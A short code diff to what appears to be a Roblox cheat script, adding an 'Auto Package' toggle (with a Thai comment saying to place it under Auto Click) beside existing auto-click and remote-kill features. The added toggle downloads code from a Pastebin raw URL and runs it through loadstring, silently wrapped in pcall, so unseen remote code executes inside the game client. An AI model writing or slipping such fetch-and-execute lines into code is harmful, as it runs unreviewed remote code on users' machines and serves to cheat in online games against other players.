@@ -103,6 +103,19 @@ Tabs.Main:AddToggle("AutoClick", {Title = "Auto Click", Default = false}):OnChan
     end)
 end)
 
+-- ==========================================
+-- เพิ่มระบบ Auto Package ตรงนี้ (ใต้ Auto Click)
+-- ==========================================
+local autoPackage = false
+Tabs.Main:AddToggle("AutoPackage", {Title = "Auto Package", Default = false}):OnChanged(function(v)
+    autoPackage = v
+    if autoPackage then
+        pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/mz25jTgu"))()
+        end)
+    end
+end)
+-- ==========================================
 
 local autoRemoteKill = false
 local hakiArgs = {
